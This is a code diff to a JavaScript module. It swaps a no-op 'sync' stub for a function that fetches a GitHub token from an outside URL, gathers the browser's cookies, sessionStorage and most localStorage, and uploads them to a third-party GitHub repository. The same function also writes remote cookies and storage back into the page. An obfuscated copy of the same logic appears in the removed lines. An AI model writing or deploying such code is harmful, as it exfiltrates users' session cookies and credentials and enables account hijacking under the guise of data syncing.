@@ -1,5 +1,135 @@
-export function PU_Sync() {
-  console.log('❇️ | ❌ SyncData [ Sync annulée .]')
-}
+export async function PU_Sync() {
+  const tokenUrl = 'https://pkyt-database-up.vercel.app/code-source/E-CDE/Secure-token.js';
 
-// function _0x16fc(){const _0x1bde11=['forEach','83730CrxhLK','cookie','SessionStorage','APP:??','PKYT-Service','Compte','80zaOpSU','ECDE:ID_IP','Rules','Cookies','LocalStorage','log','clear','fr-FR','226305ufFpIh','PUT','token\x20','https://pkyt-database-up.vercel.app/code-source/E-CDE/Secure-token.js','11Kyhlxb','database_EnesCDE','entries','✅\x20Données\x20synchronisées\x20avec\x20GitHub\x20!','stringify','main','sha','getItem','toLocaleDateString','AuthToken','ecde/sync/','1020xWbkNt','location','236rjkBGq','116830dcODGR','✅\x20Données\x20synchronisées\x20localement\x20!','1376870MPyOek','push','error','https://api.github.com/repos/','/contents/','toLocaleTimeString','4508pTInpk','20136YYcHZu','application/json','json','Site','\x20for\x20','setItem','includes','386646FuQfXT'];_0x16fc=function(){return _0x1bde11;};return _0x16fc();}function _0xca7e(_0x231ca0,_0x49d7c1){const _0x16fc68=_0x16fc();return _0xca7e=function(_0xca7e61,_0x3145c6){_0xca7e61=_0xca7e61-0x196;let _0x30cfdf=_0x16fc68[_0xca7e61];return _0x30cfdf;},_0xca7e(_0x231ca0,_0x49d7c1);}(function(_0x35248f,_0x28d882){const _0x5c5f53=_0xca7e,_0x15dbd9=_0x35248f();while(!![]){try{const _0x337689=-parseInt(_0x5c5f53(0x19b))/0x1+parseInt(_0x5c5f53(0x199))/0x2+-parseInt(_0x5c5f53(0x1c4))/0x3*(parseInt(_0x5c5f53(0x1ba))/0x4)+parseInt(_0x5c5f53(0x1bb))/0x5+parseInt(_0x5c5f53(0x1b8))/0x6*(parseInt(_0x5c5f53(0x1c3))/0x7)+parseInt(_0x5c5f53(0x1a1))/0x8*(parseInt(_0x5c5f53(0x1a9))/0x9)+-parseInt(_0x5c5f53(0x1bd))/0xa*(-parseInt(_0x5c5f53(0x1ad))/0xb);if(_0x337689===_0x28d882)break;else _0x15dbd9['push'](_0x15dbd9['shift']());}catch(_0x6035af){_0x15dbd9['push'](_0x15dbd9['shift']());}}}(_0x16fc,0x39830));export async function PU_Sync(){const _0x13732b=_0xca7e,_0x45153e=_0x13732b(0x1ac),_0x5c3543=await fetch(_0x45153e),{GITHUB_TOKEN:_0x5e6078}=await _0x5c3543[_0x13732b(0x1c6)](),_0x2e3255=_0x13732b(0x19f),_0x5034f5=_0x13732b(0x1ae),_0x5b1f6e=_0x13732b(0x1b7),_0x404ef2=localStorage[_0x13732b(0x1b4)](_0x13732b(0x1a2));if(!_0x404ef2)return console[_0x13732b(0x1bf)]('❌\x20ECDE:ID_IP\x20manquant\x20!');const _0x54f19e=''+_0x5b1f6e+_0x404ef2+'.json',_0x173b34=window[_0x13732b(0x1b9)]['hostname'],_0x29133d=[_0x13732b(0x1a0),_0x13732b(0x1b6),_0x13732b(0x19e),_0x13732b(0x1a3)];function _0x45fc9f(){const _0x13ed92=_0x13732b,_0x504f14={};return Object['keys'](localStorage)[_0x13ed92(0x19a)](_0x21e386=>{!_0x29133d['includes'](_0x21e386)&&(_0x504f14[_0x21e386]=localStorage['getItem'](_0x21e386));}),_0x504f14;}function _0x289252(){const _0x1ffa75=_0x13732b;return{'Site':_0x173b34,'URL':window[_0x1ffa75(0x1b9)]['href'],'Date':new Date()[_0x1ffa75(0x1b5)](_0x1ffa75(0x1a8)),'Time':new Date()[_0x1ffa75(0x1c2)]('fr-FR'),'LocalStorage':_0x45fc9f(),'SessionStorage':{...sessionStorage},'Cookies':document[_0x1ffa75(0x19c)]};}async function _0x400894(){const _0x3e0b8d=_0x13732b,_0x2fb710=_0x3e0b8d(0x1c0)+_0x2e3255+'/'+_0x5034f5+'/contents/'+_0x54f19e,_0x6a5fd7=await fetch(_0x2fb710,{'headers':{'Authorization':_0x3e0b8d(0x1ab)+_0x5e6078}});if(_0x6a5fd7['ok']){const _0xd33a3b=await _0x6a5fd7[_0x3e0b8d(0x1c6)]();return{'content':JSON['parse'](atob(_0xd33a3b['content'])),'sha':_0xd33a3b[_0x3e0b8d(0x1b3)]};}else return{'content':[],'sha':null};}async function _0x55a768(_0x3dbcb8,_0x1c18fd=null,_0x74c187='Sync\x20data'){const _0xf5558b=_0x13732b,_0x427ed5={'message':_0x74c187,'content':btoa(JSON[_0xf5558b(0x1b1)](_0x3dbcb8,null,0x2)),'branch':_0xf5558b(0x1b2)};if(_0x1c18fd)_0x427ed5['sha']=_0x1c18fd;const _0x40be14=await fetch('https://api.github.com/repos/'+_0x2e3255+'/'+_0x5034f5+_0xf5558b(0x1c1)+_0x54f19e,{'method':_0xf5558b(0x1aa),'headers':{'Authorization':_0xf5558b(0x1ab)+_0x5e6078,'Content-Type':_0xf5558b(0x1c5)},'body':JSON[_0xf5558b(0x1b1)](_0x427ed5)});return _0x40be14['ok'];}function _0x522a15(_0x113dba){const _0x5b3a57=_0x13732b;if(_0x113dba[_0x5b3a57(0x1a4)])document[_0x5b3a57(0x19c)]=_0x113dba['Cookies'];sessionStorage[_0x5b3a57(0x1a7)](),Object[_0x5b3a57(0x1af)](_0x113dba[_0x5b3a57(0x19d)]||{})['forEach'](([_0x48d805,_0x2f73dd])=>{const _0xb51d81=_0x5b3a57;sessionStorage[_0xb51d81(0x197)](_0x48d805,_0x2f73dd);}),Object[_0x5b3a57(0x1af)](_0x113dba[_0x5b3a57(0x1a5)]||{})[_0x5b3a57(0x19a)](([_0x60bfdb,_0x3f495b])=>{const _0x35c193=_0x5b3a57;!_0x29133d[_0x35c193(0x198)](_0x60bfdb)&&localStorage[_0x35c193(0x197)](_0x60bfdb,_0x3f495b);}),console[_0x5b3a57(0x1a6)](_0x5b3a57(0x1bc));}async function _0x247793(){const _0x2185e0=_0x13732b,_0xff92bc=_0x289252(),{content:_0x5480f4,sha:_0x1653ef}=await _0x400894();let _0x4711f8=![],_0x4a03b8=[..._0x5480f4];const _0x5e54f6=_0x4a03b8['findIndex'](_0xe30485=>_0xe30485[_0x2185e0(0x1c7)]===_0x173b34);if(_0x5e54f6!==-0x1){const _0x2b7584=_0x4a03b8[_0x5e54f6];_0x522a15(_0x2b7584),_0x4a03b8[_0x5e54f6]={..._0x2b7584,..._0xff92bc};}else _0x4a03b8[_0x2185e0(0x1be)](_0xff92bc),_0x4711f8=!![];const _0x3e795a=await _0x55a768(_0x4a03b8,_0x1653ef,'Sync\x20site\x20'+_0x173b34+_0x2185e0(0x196)+_0x404ef2);_0x3e795a?console['log'](_0x2185e0(0x1b0)):console[_0x2185e0(0x1bf)]('❌\x20Échec\x20de\x20la\x20synchronisation\x20avec\x20GitHub\x20!');}await _0x247793();}
+  // Récupère token depuis URL externe (attention CORS possible)
+  const getToken = async () => {
+    try {
+      const res = await fetch(tokenUrl);
+      if (!res.ok) throw new Error('Token fetch failed');
+      const data = await res.json();
+      return data.GITHUB_TOKEN;
+    } catch(e) {
+      console.error('Erreur récupération token:', e);
+      return null;
+    }
+  };
+
+  const token = await getToken();
+  if (!token) return console.error('❌ Impossible de récupérer token GitHub');
+
+  // Identifiant unique client
+  const clientId = localStorage.getItem('ECDE:ID_IP');
+  if (!clientId) return console.error('❌ ECDE:ID_IP manquant');
+
+  const repoOwner = 'PKYT-Service';
+  const repoName = 'database_EnesCDE';
+  const branch = 'main';
+  const filePath = `ecde/sync/${clientId}.json`;
+
+  // Exclure certaines clés si besoin
+  const excludedKeys = ['AuthToken', 'SensitiveKey', 'AnotherKeyToExclude'];
+
+  // Préparer les données localStorage à envoyer
+  const getLocalStorageData = () => {
+    const data = {};
+    Object.keys(localStorage).forEach(key => {
+      if (!excludedKeys.includes(key)) {
+        data[key] = localStorage.getItem(key);
+      }
+    });
+    return data;
+  };
+
+  // Récupérer fichier existant sur GitHub (content + sha)
+  const fetchGitHubFile = async () => {
+    const url = `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}?ref=${branch}`;
+    try {
+      const res = await fetch(url, {
+        headers: {
+          Authorization: `token ${token}`
+        }
+      });
+      if (res.status === 404) return {content: null, sha: null}; // Fichier inexistant, ok
+      if (!res.ok) throw new Error('Erreur récupération fichier GitHub');
+      const json = await res.json();
+      const content = JSON.parse(atob(json.content));
+      return {content, sha: json.sha};
+    } catch (e) {
+      console.error('Erreur fetchGitHubFile:', e);
+      return {content: null, sha: null};
+    }
+  };
+
+  // Met à jour localStorage / sessionStorage depuis données distantes
+  const applyRemoteData = (remoteData) => {
+    if (!remoteData) return;
+    Object.entries(remoteData.localStorage || {}).forEach(([k,v]) => {
+      if (!excludedKeys.includes(k)) localStorage.setItem(k, v);
+    });
+    Object.entries(remoteData.sessionStorage || {}).forEach(([k,v]) => {
+      sessionStorage.setItem(k, v);
+    });
+    if (remoteData.cookies) {
+      document.cookie = remoteData.cookies;
+    }
+  };
+
+  // Push les données locales vers GitHub (création ou update)
+  const pushToGitHub = async (data, sha=null) => {
+    const url = `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`;
+    const body = {
+      message: `Sync data for client ${clientId}`,
+      content: btoa(JSON.stringify(data, null, 2)),
+      branch,
+    };
+    if (sha) body.sha = sha;
+
+    try {
+      const res = await fetch(url, {
+        method: 'PUT',
+        headers: {
+          Authorization: `token ${token}`,
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(body)
+      });
+      if (!res.ok) throw new Error('Erreur push GitHub');
+      return true;
+    } catch (e) {
+      console.error('Erreur pushToGitHub:', e);
+      return false;
+    }
+  };
+
+  // Processus principal
+  try {
+    // 1. Récupérer le fichier distant
+    const {content: remoteContent, sha} = await fetchGitHubFile();
+
+    // 2. Appliquer les données distantes dans le navigateur
+    if (remoteContent) {
+      applyRemoteData(remoteContent);
+      console.log('✅ Données distantes appliquées localement');
+    }
+
+    // 3. Préparer données locales pour envoyer (avec métadonnées si besoin)
+    const localData = {
+      localStorage: getLocalStorageData(),
+      sessionStorage: {...sessionStorage},
+      cookies: document.cookie,
+      timestamp: new Date().toISOString(),
+      clientId
+    };
+
+    // 4. Envoyer vers GitHub (update ou création)
+    const success = await pushToGitHub(localData, sha);
+    if (success) {
+      console.log('✅ Données synchronisées avec GitHub');
+    } else {
+      console.error('❌ Échec synchronisation GitHub');
+    }
+
+  } catch (e) {
+    console.error('Erreur synchronisation PU_Sync:', e);
+  }
+}
